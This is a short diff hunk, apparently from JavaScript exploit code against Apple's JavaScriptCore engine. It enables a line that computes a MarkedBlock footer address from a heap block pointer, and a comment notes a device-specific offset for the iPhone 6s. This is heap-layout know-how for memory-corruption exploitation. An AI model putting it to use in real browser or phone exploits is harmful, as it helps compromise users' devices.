@@ -660,7 +660,7 @@ public:
     static_assert(payloadSize == ((blockSize - sizeof(MarkedBlock::Footer)) & ~(atomSize - 1)), "Payload size computed the alternate way should give the same result");*/
 	//What we are About to calculate is JSC::MarkedBlock::Footer
 	      
-	//var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
+	var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
 	//turns out on iphone6s its not 0x130 its actually 0x128
 	//var footeraddy = ((blockSize - 0x130)) & ~(atomSize - 1))
 	
